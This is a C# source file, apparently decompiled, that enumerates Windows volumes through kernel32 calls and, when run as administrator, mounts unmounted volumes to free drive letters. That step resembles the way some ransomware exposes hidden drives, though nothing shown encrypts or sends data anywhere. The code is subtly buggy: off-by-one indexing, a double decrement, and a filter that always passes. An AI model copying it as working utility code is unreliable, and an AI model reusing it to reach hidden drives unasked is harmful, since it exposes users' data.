using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace Complex;

public static class VolumeFunctions
{
	public enum DriveType : uint
	{
		Unknown,
		Error,
		Removable,
		Fixed,
		Remote,
		CDROM,
		RAMDisk
	}

	[DllImport("kernel32.dll")]
	public static extern DriveType GetDriveType([MarshalAs(UnmanagedType.LPStr)] string lpRootPathName);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string lpszVolumeName, char[] lpszVolumePathNames, uint cchBuferLength, ref uint lpcchReturnLength);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string lpszVolumeMountPoint, string lpszVolumeName);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder lpszVolumeName, int cchBufferLength);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int hFindVolume, StringBuilder lpszVolumeName, int cchBufferLength);

	public static List<string> GetVolumes()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int hFindVolume = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(hFindVolume, stringBuilder, 1024));
		return list;
	}

	public static void MountVolumes()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			string[] array = new string[26]
			{
				"Q:\\", "W:\\", "E:\\", "R:\\", "T:\\", "Y:\\", "U:\\", "I:\\", "O:\\", "P:\\",
				"A:\\", "S:\\", "D:\\", "F:\\", "G:\\", "H:\\", "J:\\", "K:\\", "L:\\", "Z:\\",
				"X:\\", "C:\\", "V:\\", "B:\\", "N:\\", "M:\\"
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == DriveType.Error)
				{
					array2[num++] = text;
				}
			}
			List<string> volumes = GetVolumes();
			uint dwRequired = 0u;
			uint cchBufferLength = 120u;
			char[] volumePathNames = new char[260];
			foreach (string item in volumes.Where((string volumeName) => !GetVolumePathNamesForVolumeNameW(volumeName, volumePathNames, cchBufferLength, ref dwRequired) || volumePathNames.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (Program.ConsoleReport)
				{
					try
					{
						Console.WriteLine("Drive Mounted: {0}", array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (Program.debugmode)
			{
				try
				{
					File.AppendAllText(Program.DebugReport, "Error while mounting network drives: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
